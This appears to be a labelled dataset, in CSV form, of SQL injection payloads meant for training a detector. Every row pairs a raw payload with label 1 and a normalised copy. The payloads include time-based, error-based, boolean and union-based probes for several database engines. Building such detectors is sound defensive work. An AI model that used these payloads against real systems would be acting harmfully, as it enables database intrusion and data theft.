Query,Label,Query_cleaned
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  8450  =  8450",1,1 and select 2 if select from select concat 0x7171706a71 select elt 3484 3484 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610 and 8450 8450
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,1,1 procedure analyse extractvalue 9255 concat 0x5c benchmark 5000000 md5 0x52515a50 1 and
"1%""   )    )     )   rlike sleep  (  5  )  #",1,1 rlike sleep 5
1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,1,1 rlike select case when 5384 7060 then 1 else 0x28 end
"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",1,1 where 6988 6988 union all select null null null null null null null null
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1 and 8312 dbms_pipe receive_message chr 69 chr 79 chr 101 chr 68 5
select   (  case when   (  6179  =  8476  )   then 6179 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when 6179 8476 then 6179 else cast 1 as int select 0 from dual end from dual
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",1,1 and 7533 7533 and alvd like alvd
1'  )   where 4277  =  4277 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1 where 4277 4277 and 7756 dbms_utility sqlid_to_sqlhash chr 113 chr 113 chr 112 chr 106 chr 113 select case when 7756 7756 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113
-5039 union all select 2114#,1,5039 union all select 2114
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd",1,1 and extractvalue 7982 concat 0x5c 0x7171706a71 select elt 7982 7982 1 0x717a767a71 and yopd like yopd
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 select jfxs from dual where 5485 5485 and char 109 char 79 char 70 char 90 regexp_substring repeat right char 5012 0 5000000000 null
"1%'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1 and 8148 like abcdefg upper hex randomblob 500000000 2
"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,1 and select 9067 from select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x from information_schema character_sets group by x a and
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",1,select from select sleep 5 srmq and hxdd hxdd
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  # aetd",1,1 and row 6237 7469 select count concat 0x7171706a71 select elt 6237 6237 1 0x717a767a71 floor rand 0 2 x from select 5192 union select 3785 union select 3931 union select 7158 a group by x aetd
-1879%'   )    )    or 3038  =  3038,1,1879 or 3038 3038
1%'   )    )    waitfor delay '0:0:5' and    (    (   '%'  =  ',1,1 waitfor delay 0 0 5 and
select   (  case when   (  8663  =  7467  )   then 8663 else 1/  (  select 0  )   end  )  --,1,select case when 8663 7467 then 8663 else 1 select 0 end
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",1,1 as dezr where 2145 2145 or sleep 5
1'+  (  select emeu where 2310  =  2310,1,1 select emeu where 2310 2310
"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1 as tuhc where 4018 4018 or char 117 char 111 char 105 char 100 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null
"1   )    )     )   union all select null,null,null#",1,1 union all select null null null
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 where 8430 8430 or 7417 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1 union all select null null null null null null null null null null
"1  )   and elt  (  4249  =  4249,7259  )  ",1,1 and elt 4249 4249 7259
"1%' union all select null,null,null,null#",1,1 union all select null null null null
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1,9098 union all select 3476 3476 3476 3476 3476 3476
1'+  (  select nxfp where 5006  =  5006,1,1 select nxfp where 5006 5006
"-7083 union all select 7705,7705,7705,7705,7705#",1,7083 union all select 7705 7705 7705 7705 7705
1'  )   and 2006  =  2006,1,1 and 2006 2006
select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  #,1,select case when 9986 8342 then 9986 else 9986 select 9986 from information_schema character_sets end
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 as ngvf where 9912 9912 or 7552 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,1,1 or elt 6272 6272 sleep 5 and
"1'  )   where 2725  =  2725 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 where 2725 2725 and 9254 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1 or 8315 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"1%"" waitfor delay '0:0:5'--",1,1 waitfor delay 0 0 5
-6412%' or 4065  =  5815 and '%'  =  ',1,6412 or 4065 5815 and
"1%""   )    )     )   union all select null,null--",1,1 union all select null null
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1 rlike select from select sleep 5 vwyq
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,1 union all select null null null null null null null null null null
"-7007  )   union all select 6704,6704--",1,7007 union all select 6704 6704
1'   )    )    as uizu where 1774  =  1774,1,1 as uizu where 1774 1774
"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",1,1 select eamo where 4958 4958 and 6537 dbms_pipe receive_message chr 76 chr 116 chr 117 chr 65 5
"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1,1 and 6414 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,1,2715 or 6942 1636 and mqeq mqeq
"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",1,3378 union all select 9357 9357 9357 9357 9357
"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1,6263 or 4747 dbms_utility sqlid_to_sqlhash chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4747 4747 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and
waitfor delay '0:0:5'  )  +',1,waitfor delay 0 0 5
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",1,1 and 6055 ctxsys drithsx sn 6055 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 6055 6055 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and gxhz gxhz
-4882' order by 1#,1,4882 order by 1
1 where 2301  =  2301,1,1 where 2301 2301
-9005 union all select 4410#,1,9005 union all select 4410
"-7324  )   or make_set  (  8486  =  6544,6544  )  ",1,7324 or make_set 8486 6544 6544
1' or sleep  (  5  )   and 'udqz'  =  'udqz,1,1 or sleep 5 and udqz udqz
"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,1,1 or updatexml 1808 concat 0x2e 0x7171706a71 select elt 1808 1808 1 0x717a767a71 8666 and
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""qyew""  =  ""qyew",1,1 and 5556 select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and qyew qyew
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",1,call regexp_substring repeat right char 3702 0 500000000 null
"1""  )   where 3084  =  3084 union all select null,null--",1,1 where 3084 3084 union all select null null
"-4993"" union all select 6959,6959,6959--",1,4993 union all select 6959 6959 6959
" end and    (    (   ""dmgj""  =  ""dmgj",1,end and dmgj dmgj
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 or 8156 select count from generate_series 1 5000000
1  )   where 8813  =  8813,1,1 where 8813 8813
1'   )    )    and sleep  (  5  )  #,1,1 and sleep 5
 (  8266  =  8266  )  *9900,1,8266 8266 9900
"1"" and 7533  =  7533 and ""dqjp""  =  ""dqjp",1,1 and 7533 7533 and dqjp dqjp
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   -- sbvl",1,1 and extractvalue 7982 concat 0x5c 0x7171706a71 select elt 7982 7982 1 0x717a767a71 sbvl
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1,select case when 1227 4014 then 1227 else 1227 select 1227 from mysql db end
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1,1 as dqgr where 2427 2427 and 3020 3020 6703
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,1 where 4445 4445 procedure analyse extractvalue 9255 concat 0x5c benchmark 5000000 md5 0x52515a50 1
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,1,1 and make_set 8403 8403 8899 and
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1,8894 or 4493 utl_inaddr get_host_address chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4493 4493 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and
"-3438""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""nxiv""  =  ""nxiv",1,3438 or 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case when 1570 1570 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and nxiv nxiv
-7901  )   order by 1--,1,7901 order by 1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1 rlike select from select sleep 5 vwyq
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1 where 6489 6489 or updatexml 1808 concat 0x2e 0x7171706a71 select elt 1808 1808 1 0x717a767a71 8666
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 or 2367 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
"-3261""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""yxms""  =  ""yxms",1,3261 or 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 5023 5023 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and yxms yxms
1 where 7464  =  7464 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1 where 7464 7464 rlike select case when 7689 7689 then 1 else 0x28 end
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",1,1 or row 1045 7562 select count concat 0x7171706a71 select elt 1045 1045 1 0x717a767a71 floor rand 0 2 x from select 8488 union select 5584 union select 3051 union select 1210 a group by x vojr
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'ckfn' like 'ckfn",1,1 or 8384 like abcdefg upper hex randomblob 500000000 2 and ckfn like ckfn
1'||  (  select 'uedy' where 8816  =  8816,1,1 select uedy where 8816 8816
"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,1 in boolean mode and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
-7951'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'blak'  =  'blak,1,7951 or 2724 in char 113 char 113 char 112 char 106 char 113 select case when 2724 2724 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and blak blak
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1 as ylyq where 2953 2953 and 2716 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
